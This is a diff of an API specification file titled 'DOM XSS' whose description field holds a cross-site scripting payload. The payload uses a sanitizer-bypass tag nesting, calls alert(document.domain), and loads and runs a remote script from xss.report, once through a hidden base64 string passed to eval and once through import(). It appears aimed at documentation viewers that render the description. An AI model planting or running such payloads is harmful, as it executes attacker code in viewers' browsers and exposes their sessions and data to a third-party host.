@@ -2,5 +2,5 @@
   info:
     version: 1.0.0
     title: DOM XSS
-    description: '<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(document.domain)><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL25vMXhqb2hud2ljayI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; onerror=eval(atob(this.id))>'
+    description: '<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(document.domain)>Img Src=//xss.report/c/no1xjohnwick OnError=import(src)>'
   paths: {}
